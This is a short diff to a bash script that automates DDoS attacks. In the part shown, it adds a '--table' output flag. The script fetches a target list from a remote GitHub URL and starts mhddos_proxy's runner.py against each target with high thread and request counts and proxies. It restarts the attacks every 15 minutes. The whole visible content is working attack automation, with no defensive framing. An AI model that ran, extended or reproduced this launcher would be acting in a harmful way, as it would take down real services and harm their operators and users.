@@ -19,6 +19,7 @@ threads="${1:-1000}"; threads="-t $threads"
 rpc="--rpc 2000"
 proxy_upd="-p 3600"
 debug="--debug"
+table="--table"
 
 # Restart attacks and update targets every 15 minutes
 while true
@@ -34,7 +35,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug $table&
       done
 sleep 15m
 done
